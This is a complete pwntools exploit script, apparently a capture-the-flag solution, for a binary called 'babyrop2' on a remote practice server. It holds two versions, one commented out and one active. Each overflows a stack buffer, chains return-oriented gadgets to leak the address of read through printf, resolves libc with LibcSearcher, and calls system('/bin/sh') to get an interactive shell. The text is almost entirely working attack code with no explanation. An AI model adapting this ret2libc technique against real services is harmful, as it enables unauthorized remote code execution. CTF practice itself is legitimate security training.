# from pwn import *
# from LibcSearcher import *
# context.log_level = 'debug'

# #p = process('./babyrop2')
# p = remote('node4.buuoj.cn',27393)
# elf = ELF('babyrop2')

# pop_rdi = 0x0000000000400733
# pop_rsi_r15 = 0x0000000000400731 
# format_str = 0x0000000000400770  
# ret_addr = 0x0000000000400734

# printf_plt = elf.plt['printf']
# read_got = elf.got['read']
# main_plt = elf.sym['main']

# payload = b'a'*0x28+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt)

# p.recvuntil(b"name? ")
# p.sendline(payload)


# read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
# print(hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')

# sys_addr = libc_base + libc.dump('system')
# bin_sh = libc_base + libc.dump('str_bin_sh')

# payload = b'a'*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
# p.sendline(payload)
# p.interactive()

from pwn import *
from LibcSearcher import *

context(os='linux',arch='amd64',log_level='debug')
io  = remote('node4.buuoj.cn',27393)
#io = remote('',)
elf = ELF("./babyrop2")

pop_rdi_ret = 0x400733
main_addr   = elf.symbols["main"]
read_got_addr = elf.got["read"]
printf_plt_addr = elf.plt["printf"]

payload = flat(b"A"*0x28,pop_rdi_ret,read_got_addr,printf_plt_addr,main_addr)

io.recvuntil(b"What's your name?")

io.sendline(payload)

io.recvuntil(b"\n")
real_read_addr = io.recvuntil(b"Wha")
real_read_addr = real_read_addr.replace(b"Wha",b"").ljust(8,b"\x00")
real_read_addr = u64(real_read_addr)
print(hex(real_read_addr))

# print(io.recv())

libc = LibcSearcher("read",real_read_addr)
base_addr = real_read_addr - libc.dump("read")
real_system_addr = base_addr + libc.dump("system")
real_str_bin_sh_addr = base_addr + libc.dump("str_bin_sh")

payload = flat(b"A"*0x28, pop_rdi_ret, real_str_bin_sh_addr, real_system_addr, main_addr)

io.recvuntil(b"t's your name?")
io.sendline(payload)

io.recv()

io.interactive()